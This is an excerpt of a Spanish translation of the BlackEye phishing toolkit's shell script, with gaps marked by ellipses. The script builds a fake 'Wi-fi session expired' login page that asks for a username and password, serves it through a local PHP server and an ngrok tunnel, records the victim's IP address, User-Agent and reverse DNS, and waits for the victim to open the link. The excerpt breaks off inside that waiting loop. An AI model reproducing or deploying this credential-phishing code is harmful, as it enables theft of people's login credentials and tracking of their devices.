...
command -v php > /dev/null 2>&1 || { echo >&2 "Necesita php pero no está instalado. Instalarlo. Abortar"; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "Necesito wget pero no está instalado. Instalarlo. Abortar"; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "Necesita descomprimir pero no está instalado. Instalarlo. Abortar"; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Necesito curl pero no está instalado. Instalarlo. Abortar"; exit 1; }
...
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escoge una opción: \e[0m\en' option
...
printf "     \e[101m\e[1;77m:: responsable de cualquier mal uso o daño causado por BlackEye.              ::\e[0m\n"
...
printf "     \e[101m\e[1;77m::         TRADUCIDO Y ACTUALIZADO POR FDNX - CREW           ::\e[0m\n"
printf "\n"
}

createpage() {
default_cap1="Sesión de Wi-fi expirada"
default_cap2="Por favor ingrese nuevamente."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Sesión de Wi-fi expirada): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Por favor ingrese nuevamente.): \e[0m' cap2
...
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] IP de la víctima:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Guardado:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
...
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Nombre de Host:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] DNS inverso:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##
...
printf "\e[1;92m[\e[0m*\e[1;92m] Iniciando el Servidor php...\n"
cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Iniciando el Servidor ngrok...\n"
...
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Esperando a que la Victima abra el link ...\e[0m\n"
while [ true ]; do
